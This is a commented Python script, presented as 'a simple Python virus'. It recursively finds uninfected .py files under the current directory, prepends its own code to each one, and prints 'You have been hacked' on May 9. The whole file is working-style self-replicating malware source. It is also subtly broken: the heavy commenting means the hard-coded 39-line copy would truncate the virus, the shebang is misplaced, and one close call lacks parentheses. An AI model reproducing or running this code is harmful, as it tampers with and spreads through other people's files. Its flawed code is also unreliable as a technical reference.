# This line is called a shebang It tells the operating system which interpreter should be used to execute the script.
#!/usr/bin/python3

# These lines import the 'os' and 'datetime' modules, which allow the script to interact with the operating system and work with dates and times.
import os
import datetime

# This line defines a constant variable, SIGNATURE, which is set to the string "VIRUS". This signature is used later in the script to check if a file is infected
SIGNATURE = "VIRUS"
# This line defines a function called 'locate', which takes one argument: 'path'. The function is used to find and return a list of all uninfected Python files in the specified path.
def locate(path):
# This line initializes an empty list called 'files_targeted', which will store the targeted files.    
    files_targeted = []    
# This line lists all files and directories in the specified 'path' using the 'os.listdir()' function.    
# This line starts a for loop that iterates through each item in 'filelist'.    
    filelist = os.listdir(path)
    for fname in filelist:
# This line checks if the current item ('fname') is a director        
        if os.path.isdir(path+"/"+fname):
# If the current item is a directory, this line recursively calls the 'locate()' function on the subdirectory and extends the 'files_targeted' list with the result.            
            files_targeted.extend(locate(path+"/"+fname))
# This line checks if the current item ('fname') is a Python file (i.e., has a '.py' extension).            
        elif fname[-3:] == ".py":
# This line initializes a variable called 'infected' and sets it to False.            
            infected = False
# This line opens the Python file and iterates through each line in the file.            
            for line in open(path+"/"+fname):
# This line checks if the SIGNATURE ("VIRUS") is present in the current line.                
                if SIGNATURE in line:
# If the SIGNATURE is found, this block sets 'infected' to True and breaks out of the loop.                    
                    infected = True
                    break
# This line checks if the current Python file is uninfected.                
            if infected == False:
# If the file is uninfected, this line appends the file's path to the 'files_targeted' list.                
                files_targeted.append(path+"/"+fname)
    return files_targeted
# This line defines a function called 'infect', which takes one argument: 'files_targeted'. The function is used to infect all uninfected Python files in the 'files_targeted' list.
def infect(files_targeted):
# This line opens the current script file.    
    virus = open(os.path.abspath(__file__))
# This line initializes an empty string called 'virusstring', which will store the contents of the virus.    
    virusstring = ""
# This line starts a for loop that iterates through each line in the current script file, with the index 'i'.    
    for i,line in enumerate(virus):
# This line checks if the index 'i' is between 0 and 38 (inclusive). This assumes that the virus code is within the first 39 lines of the script. You may need to adjust the number 39 depending on the actual length of the virus code.        
        if 0 <= i < 39:
# If the condition in line 25 is met, this line adds the current line to the 'virusstring'.            
            virusstring += line
# This line closes the current script file.            
    virus.close
# This line starts a for loop that iterates through each file in the 'files_targeted' list.    
    for fname in files_targeted:
# This line opens the current file.        
        f = open(fname)
# This line reads the content of the current file and stores it in the variable 'temp'.        
        temp = f.read()
# This line closes the current file.        
        f.close()
# This line reopens the current file in write mode.        
        f = open(fname,"w")
# This line writes the 'virusstring' (virus code) followed by the original content of the file ('temp') to the current file.        
        f.write(virusstring + temp)
# This line closes the current file.        
        f.close()
# This line defines a function called 'detonate', which takes no arguments. The function is used to execute the payload of the virus.
def detonate():
# This line checks if the current date is May 9th.    
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
# If the condition in line 37 is met, this line prints "You have been hacked" to the console.        
        print("You have been hacked")
# This line calls the 'locate()' function with the absolute path of the current working directory and stores the result in 'files_targeted'.
files_targeted = locate(os.path.abspath(""))
# This line calls the 'infect()' function with 'files_targeted' to infect all uninfected Python files.
infect(files_targeted)
# This line calls the 'detonate()' function to execute the payload of the virus.
detonate()
# this script is an example of a simple Python virus
